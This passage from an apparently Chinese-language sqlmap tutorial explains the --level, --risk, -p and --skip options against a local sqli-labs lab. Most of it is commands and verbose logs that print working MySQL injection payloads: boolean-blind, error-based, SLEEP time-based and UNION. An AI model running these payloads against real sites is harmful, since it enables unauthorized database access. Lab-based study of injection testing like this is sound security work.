[18:11:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:11:01] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[18:11:01] [INFO] testing 'MySQL inline queries'
[18:11:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:11:01] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[18:11:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:11:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:11:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:11:02] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[18:11:02] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[18:11:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:11:12] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[18:11:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:11:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:11:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:11:12] [INFO] target URL appears to have 3 columns in query
[18:11:12] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7309=7309 AND 'GVyE'='GVyE

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 5612 FROM(SELECT COUNT(*),CONCAT(0x716b627671,(SELECT (ELT(5612=5612,1))),0x71787a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'JtLU'='JtLU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9807 FROM (SELECT(SLEEP(5)))hQew) AND 'RiIn'='RiIn

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5240' UNION ALL SELECT NULL,CONCAT(0x716b627671,0x634b55616c6f7158454649744769636d6469434650587346464c714e63504972694e646d44696d76,0x71787a6271),NULL-- -
---
[18:11:18] [INFO] the back-end DBMS is MySQL
[18:11:18] [INFO] fetching banner
[18:11:18] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[18:11:18] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 18:11:18 /2020-02-29/


1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283
```

如有必要，可以先去目录中删掉缓存再测试，效果会更明显。

## 二、sqlmap自定义检测参数

查看sqlmap帮助：

```shell
python sqlmap.py -hh
1
```

选择其中部分结果：

```shell
Detection:                                                                
  These options can be used to customize the detection phase              
                                                                          
  --level=LEVEL       Level of tests to perform (1-5, default 1)          
  --risk=RISK         Risk of tests to perform (1-3, default 1)           
  --string=STRING     String to match when query is evaluated to True     
  --not-string=NOT..  String to match when query is evaluated to False    
  --regexp=REGEXP     Regexp to match when query is evaluated to True     
  --code=CODE         HTTP code to match when query is evaluated to True  
  --smart             Perform thorough tests only if positive heuristic(s)
  --text-only         Compare pages based only on the textual content     
  --titles            Compare pages based only on their titles            
123456789101112
```

包括了–level和–risk两个参数。

### 1.sqlmap设置检测等级

参数：
`--level`
此参数用于指定检测级别，有1~5共5级；
默认为1，表示做最少的检测，相应的，5级表示做最多的检测。
等级为1时检测get和post请求；
等级为2时检测cookies；
等级为3时检测user-agent和referer；
等级越高检测的内容也会越多。
更具体的可以查看sqlmap目录下的**data\xml\payloads**（旧版本的sqlmap可能目录不完全一致，可能是xml\payloads），内容示例如下：

```xml
    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause</title>
        <stype>1</stype>
        <level>1</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND [INFERENCE]</vector>
        <request>
            <payload>AND [RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause</title>
        <stype>1</stype>
        <level>1</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>2</where>
        <vector>OR [INFERENCE]</vector>
        <request>
            <payload>OR [RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (NOT)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>1</where>
        <vector>OR NOT [INFERENCE]</vector>
        <request>
            <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647
```

测试举例：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --banner --level 2 -v 5
1
```

打印

```shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:29:07 /2020-02-29/

[18:29:07] [DEBUG] cleaning up configuration parameters
[18:29:07] [DEBUG] setting the HTTP timeout
[18:29:07] [DEBUG] setting the HTTP User-Agent header
[18:29:07] [DEBUG] creating HTTP requests opener object
[18:29:08] [INFO] resuming back-end DBMS 'mysql'
[18:29:08] [INFO] testing connection to the target URL
[18:29:08] [TRAFFIC OUT] HTTP request [#1]:
GET /sqli-labs/Less-1/?id=1--banner HTTP/1.1
Cache-control: no-cache
User-agent: sqlmap/1.4.2.31#dev (http://sqlmap.org)
Host: 127.0.0.1
Accept: */*
Accept-encoding: gzip,deflate
Connection: close

[18:29:08] [DEBUG] declared web page charset 'utf-8'
[18:29:08] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Sat, 29 Feb 2020 10:29:08 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a
X-Powered-By: PHP/7.3.4
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
URI: http://127.0.0.1:80/sqli-labs/Less-1/?id=1--banner
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7309=7309 AND 'GVyE'='GVyE
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 5612 FROM(SELECT COUNT(*),CONCAT(0x716b627671,(SELECT (ELT(5612=5612,1))),0x71787a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'JtLU'='JtLU
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9807 FROM (SELECT(SLEEP(5)))hQew) AND 'RiIn'='RiIn
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5240' UNION ALL SELECT NULL,CONCAT(0x716b627671,0x634b55616c6f7158454649744769636d6469434650587346464c714e63504972694e646d44696d76,0x71787a6271),NULL-- -
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL-- -
---
[18:29:08] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[18:29:08] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 18:29:08 /2020-02-29/

          
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465
```

### 2.sqlmap设置风险等级

参数：
`--risk`
此参数用于指定风险等级，有1~3共3级；
默认风险等级为1，此等级在大多数情况下对测试目标无害；
风险等级2添加了基于时间的注入测试，等级3添加了OR测试。

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1--banner --risk 2 -v 5
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 18:33:59 /2020-02-29/                                                                                                                      
                                                                                                                                                          
[18:33:59] [DEBUG] cleaning up configuration parameters                                                                                                   
[18:34:00] [DEBUG] setting the HTTP timeout                                                                                                               
[18:34:00] [DEBUG] setting the HTTP User-Agent header                                                                                                     
[18:34:00] [DEBUG] creating HTTP requests opener object                                                                                                   
[18:34:00] [INFO] resuming back-end DBMS 'mysql'                                                                                                          
[18:34:00] [INFO] testing connection to the target URL                                                                                                    
[18:34:00] [TRAFFIC OUT] HTTP request [#1]:                                                                                                               
GET /sqli-labs/Less-1/?id=1 HTTP/1.1                                                                                                                      
Cache-control: no-cache                                                                                                                                   
User-agent: sqlmap/1.4.2.31#dev (http://sqlmap.org)                                                                                                       
Host: 127.0.0.1                                                                                                                                           
Accept: */*                                                                                                                                               
Accept-encoding: gzip,deflate                                                                                                                             
Connection: close                                                                                                                                         
                                                                                                                                                          
[18:34:00] [DEBUG] declared web page charset 'utf-8'                                                                                                      
[18:34:00] [TRAFFIC IN] HTTP response [#1] (200 OK):                                                                                                      
Date: Sat, 29 Feb 2020 10:34:00 GMT                                                                                                                       
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a                                                                                             
X-Powered-By: PHP/7.3.4                                                                                                                                   
Connection: close                                                                                                                                         
Transfer-Encoding: chunked                                                                                                                                
Content-Type: text/html; charset=UTF-8                                                                                                                    
URI: http://127.0.0.1:80/sqli-labs/Less-1/?id=1                                                                                                           
sqlmap resumed the following injection point(s) from stored session:                                                                                      
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=1' AND 7309=7309 AND 'GVyE'='GVyE                                                                                                         
    Vector: AND [INFERENCE]                                                                                                                               
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=1' AND (SELECT 5612 FROM(SELECT COUNT(*),CONCAT(0x716b627671,(SELECT (ELT(5612=5612,1))),0x71787a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'JtLU'='JtLU                                                                                                             
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.
PLUGINS GROUP BY x)a)                                                                                                                                     
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=1' AND (SELECT 9807 FROM (SELECT(SLEEP(5)))hQew) AND 'RiIn'='RiIn                                                                         
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])                                             
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-5240' UNION ALL SELECT NULL,CONCAT(0x716b627671,0x634b55616c6f7158454649744769636d6469434650587346464c714e63504972694e646d44696d76,0x7178
7a6271),NULL-- -                                                                                                                                          
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL-- -                                                                                                       
---                                                                                                                                                       
[18:34:00] [INFO] the back-end DBMS is MySQL                                                                                                              
[18:34:00] [INFO] fetching banner                                                                                                                         
[18:34:00] [DEBUG] resuming configuration option 'string' ('Your')                                                                                        
[18:34:00] [DEBUG] resuming configuration option 'optimize' (True)                                                                                        
[18:34:00] [DEBUG] turning off switch '--null-connection' used indirectly by switch '-o'                                                                  
[18:34:00] [DEBUG] performed 0 queries in 0.00 seconds                                                                                                    
back-end DBMS: MySQL >= 5.0                                                                                                                               
banner: '5.7.26'                                                                                                                                          
[18:34:00] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 18:34:00 /2020-02-29/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475
```

风险等级设为3时，同时注入点是update时，才会修改数据库中的数据。

## 三、sqlmap指定位置注入

### 1.sqlmap设置指定注入参数

默认情况下Sqlmap会测试所有GET参数和POST参数，当level大于等于2时会测试cookie参数， 当level大于等于3时会测试User-Agent和Referer。
实际上还可以手动指定一个以逗号分隔的、 要测试的参数列表，该列表中的参数不受level限制，这就是`-p`的作用。
如果不想测试某一参数则可以使用`--skip`。

#### -p参数测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -p "id,user-agent" --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:46:17 /2020-02-29/

[19:46:17] [INFO] testing connection to the target URL
[19:46:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:46:17] [INFO] testing if the target URL content is stable
[19:46:17] [INFO] target URL content is stable
[19:46:18] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[19:46:18] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[19:46:18] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[19:46:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:46:20] [WARNING] reflective value(s) found and filtering out
[19:46:20] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[19:46:20] [INFO] testing 'Generic inline queries'
[19:46:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[19:46:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[19:46:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:46:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:46:20] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:46:20] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:46:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:46:20] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[19:46:20] [INFO] testing 'MySQL inline queries'
[19:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:46:20] [WARNING] time-based comparison requires larger statistical model, please wait........ (done)
[19:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[19:46:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[19:46:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[19:46:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:46:31] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[19:46:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:46:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:46:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[19:46:31] [INFO] target URL appears to have 3 columns in query
[19:46:31] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3986=3986 AND 'enRu'='enRu

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1856 FROM(SELECT COUNT(*),CONCAT(0x716a6b7871,(SELECT (ELT(1856=1856,1))),0x7176627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'lead'='lead

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1215 FROM (SELECT(SLEEP(5)))pAXX) AND 'hFkU'='hFkU

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7916' UNION ALL SELECT NULL,CONCAT(0x716a6b7871,0x5555746d5964564d754675746c4543626c4f556c4f79716874665470654872514878594c714b4b42,0x7176627171),NULL-- -
---
[19:46:36] [INFO] the back-end DBMS is MySQL
[19:46:36] [INFO] fetching banner
[19:46:37] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[19:46:37] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 19:46:37 /2020-02-29/

                                                                                                                                         
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980
```

增加参数再测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1&us=1&uname=admin -p "id,uname" --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:07:41 /2020-02-29/

[20:07:42] [INFO] testing connection to the target URL
[20:07:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:07:42] [INFO] testing if the target URL content is stable
[20:07:42] [INFO] target URL content is stable
[20:07:42] [INFO] testing if GET parameter 'id' is dynamic
[20:07:42] [INFO] GET parameter 'id' appears to be dynamic
[20:07:42] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[20:07:42] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[20:07:42] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:07:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:07:45] [WARNING] reflective value(s) found and filtering out
[20:07:45] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[20:07:45] [INFO] testing 'Generic inline queries'
[20:07:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:07:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:07:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:07:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:07:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:07:45] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:07:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:07:45] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[20:07:45] [INFO] testing 'MySQL inline queries'
[20:07:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:07:45] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[20:07:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:07:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:07:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:07:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:07:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:07:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:07:55] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:07:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:07:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:07:55] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:07:55] [INFO] target URL appears to have 3 columns in query
[20:07:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2973=2973 AND 'kWQV'='kWQV

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 4270 FROM(SELECT COUNT(*),CONCAT(0x716a766271,(SELECT (ELT(4270=4270,1))),0x716a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'rvTB'='rvTB

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9758 FROM (SELECT(SLEEP(5)))Vtem) AND 'vzvR'='vzvR

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-4491' UNION ALL SELECT NULL,NULL,CONCAT(0x716a766271,0x7353566b685a767a4a68677574726d7662637477586e445172546473554f5872507a616670787677,0x716a6a6b71)-- -
---
[20:08:00] [INFO] the back-end DBMS is MySQL
[20:08:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
[20:08:00] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:08:00 /2020-02-29/

'us' 不是内部或外部命令，也不是可运行的程序
或批处理文件。
uname: unknown option -- banner
Try 'uname --help' for more information.
                                                                                                                                 
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283
```

#### –skip参数测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -p "id,uname" --flush-session --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:14:15 /2020-02-29/

[20:14:16] [INFO] testing connection to the target URL
[20:14:16] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:14:16] [INFO] testing if the target URL content is stable
[20:14:16] [INFO] target URL content is stable
[20:14:16] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[20:14:17] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[20:14:17] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[20:14:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:14:21] [WARNING] reflective value(s) found and filtering out
[20:14:21] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[20:14:21] [INFO] testing 'Generic inline queries'
[20:14:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:14:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:14:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:14:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:14:21] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:14:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:14:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:14:21] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[20:14:21] [INFO] testing 'MySQL inline queries'
[20:14:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:14:21] [WARNING] time-based comparison requires larger statistical model, please wait........ (done)
[20:14:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:14:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:14:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:14:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:14:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:14:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:14:32] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:14:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:14:32] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:14:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:14:32] [INFO] target URL appears to have 3 columns in query
